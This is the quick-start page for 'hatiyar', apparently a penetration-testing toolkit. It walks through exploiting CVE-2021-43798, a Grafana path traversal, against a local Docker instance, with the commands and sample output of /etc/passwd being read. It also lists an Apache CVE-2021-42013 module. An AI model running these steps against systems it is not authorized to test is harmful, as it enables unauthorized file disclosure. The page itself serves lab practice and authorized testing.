---
title: Quick Start
description: Get started with hatiyar in 5 minutes
---

## Your First Exploit in 5 Minutes

This guide will walk you through running your first CVE exploit with hatiyar using the interactive shell.

### Prerequisites

Before you start, you'll need:
- Hatiyar setup
- **Docker** (for running the vulnerable Grafana instance)

For a detailed setup guide, see the [Installation](/introduction/installation/)

### Step 0: Set Up Vulnerable Grafana

> Optional but Recommended

To test the Grafana exploit, you'll need a vulnerable Grafana instance. Use Docker to run Grafana 8.1.0 (vulnerable to CVE-2021-43798):

```bash
# Terminal 1: Start vulnerable Grafana instance
docker run -p 3000:3000 grafana/grafana:8.1.0
```

Then access it at: **http://localhost:3000**

Login credentials:
- Username: `admin`
- Password: `admin`

Keep this terminal running for the exploit to work.

## Step 1: Start the Interactive Shell

Launch the hatiyar shell:

```bash
python3 src/hatiyar/main.py shell
```

Or simply use the alias:

```bash
hatiyar
```

You'll see:

```

Welcome to Hatiyar!
Type help for available commands or ls to explore.

hatiyar>
```

## Step 2: Browse Available Modules

List all module categories:

```bash
hatiyar> ls
```

Output:

```
┏━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ Category        ┃ Description                               ┃
┡━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
│ cve             │ CVE exploit modules                       │
│ cloud           │ Cloud platform security (AWS, Azure, GCP) │
│ enumeration     │ Reconnaissance and enumeration tools      │
│ platforms       │ Platform-specific exploits and tools      │
│ misc            │ Miscellaneous modules                     │
└─────────────────┴───────────────────────────────────────────┘

Use: ls <category> to see modules in that category
```

Now list CVE modules specifically:

```bash
hatiyar> ls cve
```

Output:

```
                                CVE Modules (2)
┏━━━━━━┳━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃    # ┃ Module Path        ┃ Name                              ┃ CVE ID         ┃ Description                     ┃
┡━━━━━━╇━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
│    1 │ cve.cve_2021_42013 │ Apache HTTP Server Path Traversal │ CVE-2021-42013 │ Exploit to read arbitrary files │
│    2 │ cve.cve_2021_43798 │ Grafana Directory Traversal       │ CVE-2021-43798 │ Exploit via plugin path traversal│
└──────┴────────────────────┴───────────────────────────────────┴────────────────┴─────────────────────────────────────┘

Use: use cve.cve_2021_42013 to load a module
```

Alternatively, you can search for a specific vulnerability:

```bash
hatiyar> search grafana
```

## Step 3: Select a Module

Use the Grafana exploit module:

```bash
hatiyar> use CVE-2021-43798
```

Or using the full module path:

```bash
hatiyar> use cve.cve_2021_43798
```

Output:

```
Module loaded: CVE-2021-43798
Grafana Directory Traversal
Exploit CVE-2021-43798 to read arbitrary files via public plugins path traversal

Next steps:
   info         - View detailed information
   show options - See configuration options
   set <opt> <val> - Configure module
   run          - Execute module
```

Notice the prompt changed - you're now inside the module context!

## Step 4: View Module Options

Check what options are available:

```bash
hatiyar> show options
```

Output:

```
                                     Options for CVE-2021-43798                                      
┏━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━┳━━━━━━┓
┃ Option     ┃ Value                                                              ┃ Required ┃ Type ┃
┡━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━╇━━━━━━┩
│ RHOST      │ <not set>                                                          │   Yes    │ str  │
│ RPORT      │ 3000                                                               │    No    │ int  │
│ SCHEME     │ http                                                               │    No    │ str  │
│ VERIFY_SSL │ <not set>                                                          │    No    │ bool │
│ TIMEOUT    │ 5                                                                  │    No    │ int  │
│ FILE       │ /etc/passwd                                                        │    No    │ str  │
│ PLUGIN     │ <not set>                                                          │   Yes    │ str  │
│ USER_AGENT │ Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 │    No    │ str  │
└────────────┴────────────────────────────────────────────────────────────────────┴──────────┴──────┘

Use set <option> <value> to configure

```

## Step 5: Set Required Options

Configure the exploit for your target Grafana instance:

```bash
hatiyar (CVE-2021-43798)> set RHOST localhost
hatiyar (CVE-2021-43798)> set PLUGIN alertlist
```

If you set up Grafana with Docker as shown in Step 0:

```bash
hatiyar (CVE-2021-43798)> set RHOST localhost
hatiyar (CVE-2021-43798)> set RPORT 3000
hatiyar (CVE-2021-43798)> set PLUGIN alertlist
hatiyar (CVE-2021-43798)> set SCHEME http
```

Or read a specific file:

```bash
hatiyar (CVE-2021-43798)> set FILE /etc/passwd
```

## Step 6: Run the Exploit

Execute the exploit:

```bash
hatiyar> run
```

Output:

```
Executing CVE-2021-43798...

Targeting localhost...

Exploitation
╭──────────── CVE-2021-43798 ─────────────╮
│ Reading /etc/passwd from localhost:3000 │
╰─────────────────────────────────────────╯
✓ Success via plugin: alertlist
╭──────────────── Contents of /etc/passwd ─────────────────╮
│ root❌0:0:root:/root:/bin/ash                            │
│ bin❌1:1:bin:/bin:/sbin/nologin                          │
│ daemon❌2:2:daemon:/sbin:/sbin/nologin                   │
│ adm❌3:4:adm:/var/adm:/sbin/nologin                      │
│ lp❌4:7:lp:/var/spool/lpd:/sbin/nologin                  │
│ sync❌5:0:sync:/sbin:/bin/sync                           │
│ shutdown❌6:0:shutdown:/sbin:/sbin/shutdown              │
│ halt❌7:0:halt:/sbin:/sbin/halt                          │
│ mail❌8:12:mail:/var/mail:/sbin/nologin                  │
│ news❌9:13:news:/usr/lib/news:/sbin/nologin              │
│ uucp❌10:14:uucp:/var/spool/uucppublic:/sbin/nologin     │
│ operator❌11:0:operator:/root:/sbin/nologin              │
│ man❌13:15:man:/usr/man:/sbin/nologin                    │
│ postmaster❌14:12:postmaster:/var/mail:/sbin/nologin     │
│ cron❌16:16:cron:/var/spool/cron:/sbin/nologin           │
│ ftp❌21:21::/var/lib/ftp:/sbin/nologin                   │
│ sshd❌22:22:sshd:/dev/null:/sbin/nologin                 │
│ at❌25:25:at:/var/spool/cron/atjobs:/sbin/nologin        │
│ squid❌31:31:Squid:/var/cache/squid:/sbin/nologin        │
│ xfs❌33:33:X Font Server:/etc/X11/fs:/sbin/nologin       │
│ games❌35:35:games:/usr/games:/sbin/nologin              │
│ cyrus❌85:12::/usr/cyrus:/sbin/nologin                   │
│ vpopmail❌89:89::/var/vpopmail:/sbin/nologin             │
│ ntp❌123:123:NTP:/var/empty:/sbin/nologin                │
│ smmsp❌209:209:smmsp:/var/spool/mqueue:/sbin/nologin     │
│ guest❌405💯guest:/dev/null:/sbin/nologin                │
│ nobody❌65534:65534:nobody:/:/sbin/nologin               │
│ grafana❌472:0:Linux User,,,:/home/grafana:/sbin/nologin │
│                                                          │
╰──────────────────────────────────────────────────────────╯

Module executed successfully
```

## Step 7: Explore More Modules

Go back to the main shell:

```bash
hatiyar> back
```

List all available modules:

```bash
hatiyar> ls
```

Or list by category:

```bash
hatiyar> ls cve
hatiyar> ls enumeration
hatiyar> ls cloud
```

## CLI Alternative

If you prefer one-liners for scripting:

```bash
python3 src/hatiyar/main.py run CVE-2021-43798 \
  --set RHOST=localhost \
  --set RPORT=3000 \
  --set PLUGIN=alertlist
```

## Using Make Commands

For quick shortcuts:

```bash
make shell    # Launch interactive shell
make serve    # Start web dashboard [WIP]
make info     # Show project info
```

## Next Steps

- **[Usage Guide](/guides/usage/)** - Learn all commands and workflows
- **[Contributing](/contribution/guidelines/)** - Add your own modules


## Security Disclaimer

⚠️ **For Authorized Testing Only**

This toolkit is provided for educational and authorized security testing purposes only. Users must:

- Only test systems they own or have explicit written permission to test
- Comply with all applicable local, state, and federal laws
- Use responsibly and ethically
- Never use for malicious purposes or unauthorized access
- Understand and be responsible for the consequences of running exploits
- The developers assume no liability for misuse of this software.